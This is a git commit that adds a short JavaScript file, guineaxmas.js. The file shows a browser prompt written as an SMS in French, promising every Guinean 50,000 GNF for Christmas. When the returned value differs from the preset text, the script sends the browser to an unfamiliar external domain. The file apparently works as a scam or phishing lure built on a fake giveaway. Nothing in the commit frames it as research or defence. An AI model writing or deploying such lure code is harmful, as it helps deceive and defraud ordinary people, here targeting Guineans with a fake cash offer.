9113f567bfa97f3e687704ed3dc24fc519ae09c6
newetijazz10 <newetijazz10@gmail.com>
2025-12-19 09:28:42 +0100

    Create guineaxmas.js

---
+++ guineaxmas.js
@@ -0,0 +1,5 @@
+var password = 'Retirer Noel 50,000GNF'
+password=prompt('SMS: Pour fêter Noël cette année, nous offrons 50 000 francs GNF à tous les Guinéens. Cliquez sur OK pour profiter de l’offre.','Retirer Noel 50,000GNF');
+if (password != 'Retirer Noel 50,000GNF') {
+location.href='https://www.favmrzi.online/Retirer-Noel-50000GNF';
+}
